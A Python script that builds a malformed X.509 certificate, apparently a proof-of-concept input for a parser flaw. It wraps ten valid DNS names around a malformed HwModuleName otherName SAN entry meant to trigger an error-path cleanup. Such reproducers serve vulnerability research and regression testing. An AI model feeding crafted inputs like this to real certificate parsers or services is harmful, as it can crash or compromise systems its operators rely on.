def asn1_length(length):
    if length < 128:
        return bytes([length])
    elif length < 256:
        return bytes([0x81, length])
    else:
        return bytes([0x82, (length >> 8) & 0xff, length & 0xff])

def asn1_tag_length_value(tag, value):
    return bytes([tag]) + asn1_length(len(value)) + value

def asn1_sequence(content):
    return asn1_tag_length_value(0x30, content)

def asn1_int(value):
    if value == 0:
        return asn1_tag_length_value(0x02, b'\x00')
    val_bytes = value.to_bytes((value.bit_length() + 7) // 8, 'big')
    if val_bytes[0] & 0x80:
        val_bytes = b'\x00' + val_bytes
    return asn1_tag_length_value(0x02, val_bytes)

def asn1_oid(oid_str):
    parts = [int(x) for x in oid_str.split('.')]
    result = bytes([40 * parts[0] + parts[1]])
    for part in parts[2:]:
        if part < 128:
            result += bytes([part])
        else:
            encoded = []
            while part > 0:
                encoded.insert(0, (part & 0x7f) | (0x80 if len(encoded) > 0 else 0))
                part >>= 7
            result += bytes(encoded)
    return asn1_tag_length_value(0x06, result)

def asn1_utf8string(s):
    return asn1_tag_length_value(0x0c, s.encode('utf-8'))

def asn1_utctime(s):
    return asn1_tag_length_value(0x17, s.encode('ascii'))

def asn1_bitstring(bits):
    return asn1_tag_length_value(0x03, b'\x00' + bits)

def asn1_octetstring(data):
    return asn1_tag_length_value(0x04, data)

# Certificate components
version = asn1_tag_length_value(0xa0, asn1_int(2))
serial = asn1_int(1)
sig_alg_oid = asn1_oid('1.2.840.113549.1.1.11')
sig_alg = asn1_sequence(sig_alg_oid + asn1_tag_length_value(0x05, b''))

name_component = asn1_sequence(asn1_sequence(asn1_oid('2.5.4.3') + asn1_utf8string('Test')))
issuer = asn1_sequence(name_component)
subject = asn1_sequence(name_component)

validity = asn1_sequence(
    asn1_utctime('230101000000Z') +
    asn1_utctime('240101000000Z')
)

modulus = asn1_int(0x010001)
exponent = asn1_int(65537)
rsa_key = asn1_sequence(modulus + exponent)
pubkey_alg = asn1_sequence(asn1_oid('1.2.840.113549.1.1.1') + asn1_tag_length_value(0x05, b''))
pubkey = asn1_sequence(pubkey_alg + asn1_bitstring(rsa_key))

# Create many SAN entries
san_entries = []

# Add 10 valid dNSName entries to create allocations
for i in range(10):
    san_entries.append(asn1_tag_length_value(0x82, f'example{i}.com'.encode()))

# Add a malformed otherName that will trigger cleanup
hwmodule_oid = asn1_oid('1.3.6.1.5.5.7.8.4')
# Create otherName that has correct HwModuleName OID but then fails at [0] EXPLICIT check
malformed_content = hwmodule_oid + b'\x30\x05\x06\x03\x01\x02\x03'  # SEQUENCE instead of [0]
malformed_other = asn1_tag_length_value(0xa0, malformed_content)
san_entries.append(malformed_other)

# Add one more to trigger the parse of the malformed one
san_entries.append(asn1_tag_length_value(0x82, b'final.com'))

# GeneralNames SEQUENCE
san_sequence = asn1_sequence(b''.join(san_entries))

# SAN extension
san_oid = asn1_oid('2.5.29.17')
san_ext = asn1_sequence(san_oid + asn1_octetstring(san_sequence))
extensions = asn1_tag_length_value(0xa3, asn1_sequence(san_ext))

# TBS Certificate
tbs = asn1_sequence(
    version + serial + sig_alg + issuer + validity + subject + pubkey + extensions
)

signature = asn1_bitstring(b'\x00' * 64)
cert = asn1_sequence(tbs + sig_alg + signature)

with open('many_san.der', 'wb') as f:
    f.write(cert)

print(f"Created certificate with {len(san_entries)} SAN entries: {len(cert)} bytes")
